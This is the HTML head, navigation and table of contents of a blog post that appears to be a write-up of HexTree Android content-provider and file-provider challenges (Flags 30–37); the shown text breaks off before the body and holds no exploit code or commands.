<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=false><head><meta charset=utf-8><meta http-equiv=content-language content="en"><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=theme-color><title>HEX Tree Content & File providers Challenges &#183; JoyBoy</title><meta name=title content="HEX Tree Content & File providers Challenges &#183; JoyBoy"><meta name=description content="My awesome website"><meta name=keywords content="ctf,Andorid,contnet provider,file provider,hextree,"><link rel=canonical href=https://happy-joyboy.github.io/superBLog/posts/ctf/mobile/hex/hex_provider/><link type=text/css rel=stylesheet href=/superBLog/css/main.bundle.min.e4ba56a8ad59d5adc47fa601550620d05f41729179c25532a8b77a1a718e6bfc695287c89a63321aba49b7b7027b3c8fde3d8786426cb389e9c1d66880b124d5.css integrity="sha512-5LpWqK1Z1a3Ef6YBVQYg0F9BcpF5wlUyqLd6GnGOa/xpUofImmMyGrpJt7cCezyP3j2HhkJss4npwdZogLEk1Q=="><script type=text/javascript src=/superBLog/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj+e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script><script defer type=text/javascript id=script-bundle src=/superBLog/js/main.bundle.min.98bb8ce8f123e03c4d2171eeec151dd404b5c476beb5ef1068d0e8b1a2afb923065e6552fc14b2d867c85ee4bd8529a43193f729f874d3908517ba03b5d1cc57.js integrity="sha512-mLuM6PEj4DxNIXHu7BUd1AS1xHa+te8QaNDosaKvuSMGXmVS/BSy2GfIXuS9hSmkMZP3Kfh005CFF7oDtdHMVw==" data-copy=Copy data-copied=Copied></script><script src=/superBLog/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7+kfJ6kKCJxQGC+8wm+Bz9JucDjDTGNew=="></script><link rel=apple-touch-icon sizes=180x180 href=/superBLog/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/superBLog/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/superBLog/favicon-16x16.png><link rel=manifest href=/superBLog/site.webmanifest><meta property="og:url" content="https://happy-joyboy.github.io/superBLog/posts/ctf/mobile/hex/hex_provider/"><meta property="og:site_name" content="JoyBoy"><meta property="og:title" content="HEX Tree Content & File providers Challenges"><meta property="og:description" content="My awesome website"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-07-30T00:55:36+03:00"><meta property="article:modified_time" content="2025-07-30T00:55:36+03:00"><meta property="article:tag" content="Ctf"><meta property="article:tag" content="Andorid"><meta property="article:tag" content="Contnet Provider"><meta property="article:tag" content="File Provider"><meta property="article:tag" content="Hextree"><meta name=twitter:card content="summary"><meta name=twitter:title content="HEX Tree Content & File providers Challenges"><meta name=twitter:description content="My awesome website"><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"","name":"HEX Tree Content \u0026 File providers Challenges","headline":"HEX Tree Content \u0026 File providers Challenges","inLanguage":"en","url":"https:\/\/happy-joyboy.github.io\/superBLog\/posts\/ctf\/mobile\/hex\/hex_provider\/","author":{"@type":"Person","name":"Saeed Khalid"},"copyrightYear":"2025","dateCreated":"2025-07-30T00:55:36\u002b03:00","datePublished":"2025-07-30T00:55:36\u002b03:00","dateModified":"2025-07-30T00:55:36\u002b03:00","keywords":["ctf","Andorid","contnet provider","file provider","hextree"],"mainEntityOfPage":"true","wordCount":"3749"}]</script><meta name=author content="Saeed Khalid"><link href=https://github.com/happy-joyboy rel=me><link href=https://www.linkedin.com/in/saeed-khalid-awaad/ rel=me><link href=https://x.com/0badsecurity0 rel=me><link href=https://www.youtube.com/@joyboy_404 rel=me><script src=/superBLog/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj+KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script><script defer type=text/javascript src=/superBLog/js/mermaid.bundle.7ba6a6c0bd37bcf130eb1599c5a9e7c634173a87af5afb97bda7139f1f24b9b861c383fd25a9f9154f087b7220051fb330852bb324032e82c4b0b0f8d3913d93.js integrity="sha512-e6amwL03vPEw6xWZxannxjQXOoevWvuXvacTnx8kubhhw4P9Jan5FU8Ie3IgBR+zMIUrsyQDLoLEsLD405E9kw=="></script></head><body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a></div><div class=min-h-[148px]></div><div class="fixed inset-x-0 min-h-[130px] opacity-65 pl-[24px] pr-[24px] bg-gradient-to-b from-neutral from-60% dark:from-neutral-800 to-transparent mix-blend-normal z-80"></div><div class="fixed inset-x-0 pl-[24px] pr-[24px] z-100"><div id=menu-blur class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl"></div><div class="relative max-w-[64rem] ml-auto mr-auto"><div class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0"><div><a href=/superBLog/ class=flex><span class=sr-only>JoyBoy</span>
<img src=/superBLog/img/profile/imagesluffy.jpeg width=150 height=84 class="logo max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt=JoyBoy></a></div><div class="flex flex-1 items-center justify-between"><nav class="flex space-x-3"><a href=/superBLog/ class="text-base font-medium text-gray-500 hover:text-gray-900">JoyBoy</a></nav><nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12"><a href=/superBLog/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title=JoyBoy>Home</p></a><a href=/superBLog/posts/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title>Blog</p></a><a href=/superBLog/tags/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title>Tags</p></a><a href=/superBLog/about/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-base font-medium" title=First>who am I?</p></a><div><div class="cursor-pointer flex items-center nested-menu"><span class="ltr:mr-1 rtl:ml-1"><span class="relative block icon"><svg viewBox="0 0 640 512"><path fill="currentColor" d="M0 128C0 92.7 28.7 64 64 64H256h48 16H576c35.3.0 64 28.7 64 64V384c0 35.3-28.7 64-64 64H320 304 256 64c-35.3.0-64-28.7-64-64V128zm320 0V384H576V128H320zM178.3 175.9c-3.2-7.2-10.4-11.9-18.3-11.9s-15.1 4.7-18.3 11.9l-64 144c-4.5 10.1.1 21.9 10.2 26.4s21.9-.1 26.4-10.2l8.9-20.1h73.6l8.9 20.1c4.5 10.1 16.3 14.6 26.4 10.2s14.6-16.3 10.2-26.4l-64-144zM160 233.2 179 276H141l19-42.8zM448 164c11 0 20 9 20 20v4h44 16c11 0 20 9 20 20s-9 20-20 20h-2l-1.6 4.5c-8.9 24.4-22.4 46.6-39.6 65.4.9.6 1.8 1.1 2.7 1.6l18.9 11.3c9.5 5.7 12.5 18 6.9 27.4s-18 12.5-27.4 6.9L467 333.8c-4.5-2.7-8.8-5.5-13.1-8.5-10.6 7.5-21.9 14-34 19.4l-3.6 1.6c-10.1 4.5-21.9-.1-26.4-10.2s.1-21.9 10.2-26.4l3.6-1.6c6.4-2.9 12.6-6.1 18.5-9.8L410 286.1c-7.8-7.8-7.8-20.5.0-28.3s20.5-7.8 28.3.0l14.6 14.6.5.5c12.4-13.1 22.5-28.3 29.8-45H448 376c-11 0-20-9-20-20s9-20 20-20h52v-4c0-11 9-20 20-20z"/></svg></span></span><div class="text-sm font-medium text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" title="HEX Tree Content & File providers Challenges">EN</div></div><div class="absolute menuhide"><div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl"><div class="flex flex-col space-y-3"><a href=/superBLog/posts/ctf/mobile/hex/hex_provider/ class="flex items-center"><p class="text-sm font-sm text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" title="HEX Tree Content & File providers Challenges">EN</p></a><a href=/superBLog/ar/posts/ctf/mobile/hex/hex_provider/ class="flex items-center"><p class="text-sm font-sm text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" title="تحديات HEX Tree Content & File providers">AR</p></a></div></div></div></div><button id=search-button aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button><div class="flex items-center"><button id=appearance-switcher aria-label="Dark mode switcher" type=button class="text-base hover:text-primary-600 dark:hover:text-primary-400"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></nav><div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12"><span></span><div><div class="cursor-pointer flex items-center nested-menu"><span class="ltr:mr-1 rtl:ml-1"><span class="relative block icon"><svg viewBox="0 0 640 512"><path fill="currentColor" d="M0 128C0 92.7 28.7 64 64 64H256h48 16H576c35.3.0 64 28.7 64 64V384c0 35.3-28.7 64-64 64H320 304 256 64c-35.3.0-64-28.7-64-64V128zm320 0V384H576V128H320zM178.3 175.9c-3.2-7.2-10.4-11.9-18.3-11.9s-15.1 4.7-18.3 11.9l-64 144c-4.5 10.1.1 21.9 10.2 26.4s21.9-.1 26.4-10.2l8.9-20.1h73.6l8.9 20.1c4.5 10.1 16.3 14.6 26.4 10.2s14.6-16.3 10.2-26.4l-64-144zM160 233.2 179 276H141l19-42.8zM448 164c11 0 20 9 20 20v4h44 16c11 0 20 9 20 20s-9 20-20 20h-2l-1.6 4.5c-8.9 24.4-22.4 46.6-39.6 65.4.9.6 1.8 1.1 2.7 1.6l18.9 11.3c9.5 5.7 12.5 18 6.9 27.4s-18 12.5-27.4 6.9L467 333.8c-4.5-2.7-8.8-5.5-13.1-8.5-10.6 7.5-21.9 14-34 19.4l-3.6 1.6c-10.1 4.5-21.9-.1-26.4-10.2s.1-21.9 10.2-26.4l3.6-1.6c6.4-2.9 12.6-6.1 18.5-9.8L410 286.1c-7.8-7.8-7.8-20.5.0-28.3s20.5-7.8 28.3.0l14.6 14.6.5.5c12.4-13.1 22.5-28.3 29.8-45H448 376c-11 0-20-9-20-20s9-20 20-20h52v-4c0-11 9-20 20-20z"/></svg></span></span><div class="text-sm font-medium text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" title="HEX Tree Content & File providers Challenges">EN</div></div><div class="absolute menuhide"><div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl"><div class="flex flex-col space-y-3"><a href=/superBLog/posts/ctf/mobile/hex/hex_provider/ class="flex items-center"><p class="text-sm font-sm text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" title="HEX Tree Content & File providers Challenges">EN</p></a><a href=/superBLog/ar/posts/ctf/mobile/hex/hex_provider/ class="flex items-center"><p class="text-sm font-sm text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" title="تحديات HEX Tree Content & File providers">AR</p></a></div></div></div></div><button id=search-button-mobile aria-label=Search class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></button>
<button id=appearance-switcher-mobile aria-label="Dark mode switcher" type=button class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1"><div class="flex items-center justify-center dark:hidden"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg></span></div><div class="items-center justify-center hidden dark:flex"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg></span></div></button></div></div><div class="-my-2 md:hidden"><div id=menu-button class=block><div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></div><div id=menu-wrapper class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]"><ul class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl"><li id=menu-close-button><span class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400"><span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></span></li><li class=mt-1><a href=/superBLog/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title=JoyBoy>Home</p></a></li><li class=mt-1><a href=/superBLog/posts/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title>Blog</p></a></li><li class=mt-1><a href=/superBLog/tags/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title>Tags</p></a></li><li class=mt-1><a href=/superBLog/about/ class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400"><p class="text-bg font-bg" title=First>who am I?</p></a></li></ul></div></div></div></div><script>(function(){var e=$(".main-menu"),t=window.location.pathname;e.find('a[href="'+t+'"]').each(function(e,t){$(t).children("p").addClass("active")})})()</script></div></div><script type=text/javascript src=/superBLog/js/background-blur.min.78ad5090e7c0c2533bac9dd23bdb1f723f834e5c3626627bd31017cc139ce0651b529877862129cee49e380ab2fdcd8baef28ae3e086bc54957fdaa7758775b2.js integrity="sha512-eK1QkOfAwlM7rJ3SO9sfcj+DTlw2JmJ70xAXzBOc4GUbUph3hiEpzuSeOAqy/c2LrvKK4+CGvFSVf9qndYd1sg==" data-target-id=menu-blur></script><div class="relative flex flex-col grow"><main id=main-content class=grow><article><div id=hero class="h-[150px] md:h-[200px]"></div><div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom" style=background-image:url(/superBLog/img/profile/bleach_hu_aa1d93a24885f8fd.jpg)><div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div><div class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div></div><div id=background-blur class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div><script type=text/javascript src=/superBLog/js/background-blur.min.78ad5090e7c0c2533bac9dd23bdb1f723f834e5c3626627bd31017cc139ce0651b529877862129cee49e380ab2fdcd8baef28ae3e086bc54957fdaa7758775b2.js integrity="sha512-eK1QkOfAwlM7rJ3SO9sfcj+DTlw2JmJ70xAXzBOc4GUbUph3hiEpzuSeOAqy/c2LrvKK4+CGvFSVf9qndYd1sg==" data-target-id=background-blur></script><header id=single_header class="mt-5 max-w-prose"><ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden"><li class=hidden><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/superBLog/>JoyBoy</a><span class="px-1 text-primary-500">/</span></li><li class=inline><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/superBLog/posts/>posts</a><span class="px-1 text-primary-500">/</span></li><li class=hidden><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/superBLog/posts/ctf/mobile/hex/hex_provider/>HEX Tree Content & File providers Challenges</a><span class="px-1 text-primary-500">/</span></li></ol><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">HEX Tree Content & File providers Challenges</h1><div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime=2025-07-30T00:55:36+03:00>30 July 2025</time><span class="px-2 text-primary-500">&#183;</span><span>3749 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">18 mins</span><span class="px-2 text-primary-500">&#183;</span>
<script type=text/javascript src=/superBLog/js/zen-mode.min.2a0a1375509c03daf41c53a9831aa2d560895b7a2528c3eb3b56e7b11a135c7529e49727162a053b6193be8340270a8342f42c69f3d7e262ae54bc248eaac8f5.js integrity="sha512-KgoTdVCcA9r0HFOpgxqi1WCJW3olKMPrO1bnsRoTXHUp5JcnFioFO2GTvoNAJwqDQvQsafPX4mKuVLwkjqrI9Q=="></script><span class=mb-[2px]><span id=zen-mode-button class="text-lg hover:text-primary-500" title="Enable zen mode" data-title-i18n-disable="Enable zen mode" data-title-i18n-enable="Disable zen mode"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 50 50" width="50" height="50"><path fill="currentColor" d="M12.980469 4C9.1204688 4 5.9804688 7.14 5.9804688 11L6 26H9.9804688V11c0-1.65 1.3400002-3 3.0000002-3H40.019531c1.66.0 3 1.35 3 3V39c0 1.65-1.34 3-3 3H29c0 1.54-.579062 2.94-1.539062 4H40.019531c3.86.0 7-3.14 7-7V11c0-3.86-3.14-7-7-7H12.980469zM7 28c-2.206.0-4 1.794-4 4V42c0 2.206 1.794 4 4 4H23c2.206.0 4-1.794 4-4V32c0-2.206-1.794-4-4-4H7zm0 4H23L23.001953 42H7V32z"/></svg></span></span></span></span></div><div class="flex flex-row flex-wrap items-center"><span class="mr-2 mt-[0.5rem]" onclick='return window.open("/superBLog/tags/ctf/","_self"),!1'><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Ctf
</span></span></span><span class="mr-2 mt-[0.5rem]" onclick='return window.open("/superBLog/tags/andorid/","_self"),!1'><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Andorid
</span></span></span><span class="mr-2 mt-[0.5rem]" onclick='return window.open("/superBLog/tags/contnet-provider/","_self"),!1'><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Contnet Provider
</span></span></span><span class="mr-2 mt-[0.5rem]" onclick='return window.open("/superBLog/tags/file-provider/","_self"),!1'><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">File Provider
</span></span></span><span class="mr-2 mt-[0.5rem]" onclick='return window.open("/superBLog/tags/hextree/","_self"),!1'><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Hextree</span></span></span></div></div></header><section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row"><div class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8"><div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]"><details open id=TOCView class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block"><summary class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><ul><li><a href=#db>DB</a><ul><li><a href=#database-structure><strong>Database Structure</strong></a></li><li><a href=#flag-table-schema><strong>Flag Table Schema</strong></a></li><li><a href=#note-table-schema><strong>Note Table Schema</strong></a></li><li><a href=#preloaded-data><strong>Preloaded Data</strong></a></li></ul></li><li><a href=#flag-30>Flag 30</a><ul><li><a href=#code-analysis>Code analysis</a></li><li><a href=#solution>Solution</a></li></ul></li><li><a href=#flag-31>Flag 31</a><ul><li><a href=#code-analysis-1>Code analysis</a></li><li><a href=#solution-1>Solution</a></li></ul></li><li><a href=#flag-32>Flag 32</a><ul><li><a href=#code-analysis-2>Code analysis</a></li><li><a href=#solution-2>Solution</a></li></ul></li><li><a href=#flag-33_1>Flag 33_1</a><ul><li><a href=#code-analysis-3>Code analysis</a></li><li><a href=#solution-3>Solution</a></li></ul></li><li><a href=#flag-33_2>Flag 33_2</a><ul><li><a href=#code-analysis-4>Code analysis</a></li><li><a href=#solution-4>Solution</a></li></ul></li><li><a href=#flag-34>Flag 34</a><ul><li><a href=#code-analysis-5>Code analysis</a></li><li><a href=#solution-5>Solution</a></li></ul></li><li><a href=#flag-35>Flag 35</a><ul><li><a href=#code-analysis-6>Code analysis</a></li><li><a href=#solution-6>Solution</a></li></ul></li><li><a href=#flag-36>Flag 36</a><ul><li><a href=#code-analysis-7>Code analysis</a></li><li><a href=#solution-7>Solution</a></li></ul></li><li><a href=#flag-37>Flag 37</a><ul><li><a href=#code-analysis-8>Code analysis</a></li><li><a href=#solution-8>Solution</a></li></ul></li></ul></li></ul></nav></div></details><details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden"><summary class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><ul><li><a href=#db>DB</a><ul><li><a href=#database-structure><strong>Database Structure</strong></a></li><li><a href=#flag-table-schema><strong>Flag Table Schema</strong></a></li><li><a href=#note-table-schema><strong>Note Table Schema</strong></a></li><li><a href=#preloaded-data><strong>Preloaded Data</strong></a></li></ul></li><li><a href=#flag-30>Flag 30</a><ul><li><a href=#code-analysis>Code analysis</a></li><li><a href=#solution>Solution</a></li></ul></li><li><a href=#flag-31>Flag 31</a><ul><li><a href=#code-analysis-1>Code analysis</a></li><li><a href=#solution-1>Solution</a></li></ul></li><li><a href=#flag-32>Flag 32</a><ul><li><a href=#code-analysis-2>Code analysis</a></li><li><a href=#solution-2>Solution</a></li></ul></li><li><a href=#flag-33_1>Flag 33_1</a><ul><li><a href=#code-analysis-3>Code analysis</a></li><li><a href=#solution-3>Solution</a></li></ul></li><li><a href=#flag-33_2>Flag 33_2</a><ul><li><a href=#code-analysis-4>Code analysis</a></li><li><a href=#solution-4>Solution</a></li></ul></li><li><a href=#flag-34>Flag 34</a><ul><li><a href=#code-analysis-5>Code analysis</a></li><li><a href=#solution-5>Solution</a></li></ul></li><li><a href=#flag-35>Flag 35</a><ul><li><a href=#code-analysis-6>Code analysis</a></li><li><a href=#solution-6>Solution</a></li></ul></li><li><a href=#flag-36>Flag 36</a><ul><li><a href=#code-analysis-7>Code analysis</a></li><li><a href=#solution-7>Solution</a></li></ul></li><li><a href=#flag-37>Flag 37</a><ul><li><a href=#code-analysis-8>Code analysis</a></li><li><a href=#solution-8>Solution</a></li></ul></li></ul></li></ul></nav></div></details><script>(function(){"use strict";const n=.33,s="#TableOfContents",o=".anchor",i='a[href^="#"]',a="li ul",r="active";function c(e,t){const s=window.scrollY+window.innerHeight*t,o=[...document.querySelectorAll('#TableOfContents a[href^="#"]')],n=new Set(o.map(e=>e.getAttribute("href").substring(1)));for(let t=e.length-1;t>=0;t--){const 